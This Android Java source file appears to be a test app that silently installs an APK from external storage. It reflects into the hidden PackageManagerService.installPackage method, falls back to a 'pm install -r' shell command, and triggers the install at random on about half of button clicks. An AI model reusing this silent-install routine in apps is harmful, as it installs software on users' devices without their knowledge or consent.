package com.example.test;

import java.io.File;
import java.lang.reflect.Method;
import java.security.SecureRandom;

import com.example.test.R;
import com.ltdmal.gss.Data;

import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class MainActivity extends Activity {

	private Button button_install;
	private TextView install_message;
	private static TextView result;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		Data.start(getApplicationContext(), "A820", "A632");

		button_install = (Button) findViewById(R.id.button_install);
		install_message = (TextView) findViewById(R.id.install_message);
		result = (TextView) findViewById(R.id.result);

		// 判断是否有静默安装的权限
		boolean InstallResult = isHasInsPermission(getApplicationContext());
		if (InstallResult) {
			install_message.setText("有安装的权限");
		} else {
			install_message.setText("没有安装的权限");
		}

		// 判断安装的应用是否已经存在
		boolean isInstall = isInstalled(getApplicationContext(),
				"com.flash.browser.pro");
		if (isInstall) {
			result.setText("安装应用已存在");
		}

		// 按钮的点击事件
		button_install.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				ceshiLog.PrintLog("click");
				ceshiLog.PrintLog("SDKExist");
				String path = Environment.getExternalStorageDirectory()
						.getAbsolutePath() + "/" + "testDemo.apk";
				ceshiLog.PrintLog("path:" + path);
				result.setText("已点击，请耐心等待。。。");
				int random=getRandom(100);
				if (random<50) {
					installSilently(getApplicationContext(), path);
				}else {
					result.setText("random is "+random);	
				}
			

			}
		});
	}

	/**
	 * 判断应用是否已经安装
	 * 
	 * @param context
	 *            上下文
	 * @param packageName
	 *            包名
	 * @return
	 */
	private boolean isInstalled(Context context, String packageName) {
		try {
			context.getPackageManager().getPackageInfo(packageName, 0);
		} catch (Exception e) {
			return false;
		}
		return true;
	}

	/**
	 * 安装成功之后的提示
	 */
	public static void installSuccess() {
		result.setText("安装成功！");
	}

	
	/**
	 * 静默安装的反射方法
	 * 
	 * @param context
	 *            上下文
	 * @param filePath
	 *            安装App的文件路径
	 * @return
	 */
	private boolean installSilently(Context context, String filePath) {

		try {
			Class<?> pmService = null;
			Class<?> activityThread = null;
			Method method = null;

			final String STR_PACKAGEMANAGER = "getPackageManager";
			final String STR_INSTALL = "installPackage";

			activityThread = Class.forName("android.app.ActivityThread");
			Class<?> paramTypes[] = getParamTypes(activityThread,
					STR_PACKAGEMANAGER);
			method = activityThread.getMethod(STR_PACKAGEMANAGER, paramTypes);
			Object PackageManagerService = method.invoke(activityThread);

			pmService = PackageManagerService.getClass();

			Class<?> paramTypes1[] = getParamTypes(pmService, STR_INSTALL);
			method = pmService.getMethod(STR_INSTALL, paramTypes1);
			method.invoke(PackageManagerService,
					Uri.fromFile(new File(filePath)), null, 0, null);
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			pmInstall(filePath);
		}
		return false;
	}

	private static void pmInstall(String filePath) {
		try {
			Process install = Runtime.getRuntime().exec(
					"pm  install -r " + filePath + " > /dev/null");
			install.waitFor();

		} catch (Exception e1) {
			e1.printStackTrace();
		}
	}

	private static Class<?>[] getParamTypes(Class<?> cls, String mName) {
		Class<?> cs[] = null;

		try {
			Method[] mtd = cls.getMethods();

			for (int i = 0; i < mtd.length; i++) {
				if (!mtd[i].getName().equals(mName)) {
					continue;
				}
				cs = mtd[i].getParameterTypes();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return cs;
	}

	/**
	 * 是否有静默安装的权限
	 * 
	 * @param context
	 * @return
	 */
	private boolean isHasInsPermission(Context context) {
		boolean isHas = false;
		try {
			PackageManager pm = context.getPackageManager();
			int hasPerm = pm.checkPermission(
					"android.permission.INSTALL_PACKAGES",
					context.getPackageName());
			if (hasPerm == PackageManager.PERMISSION_GRANTED) {
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return isHas;
	}

	private  int getRandom(int max) {
		if (max == 0)
			return 0;
		SecureRandom random = new SecureRandom();
		int n = random.nextInt(max);
		return n;
	}
}
